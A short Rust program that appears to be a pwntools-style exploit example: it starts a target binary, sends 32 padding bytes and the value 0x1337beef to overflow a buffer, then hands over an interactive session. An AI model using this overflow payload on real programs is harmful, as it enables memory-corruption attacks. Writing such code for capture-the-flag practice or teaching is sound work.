use clap::Clap;
use pwntools::{connection::Connection, connection::Process};
use std::io;

#[derive(Clap)]
struct Opts {
    program: String,
}

fn main() -> io::Result<()> {
    let opts = Opts::parse();

    let mut conn = Process::new(&opts.program)?;
    conn.send(&b"x".repeat(32))?;
    conn.send(&0x1337beef_u64.to_le_bytes())?;
    conn.interactive()?;
    Ok(())
}
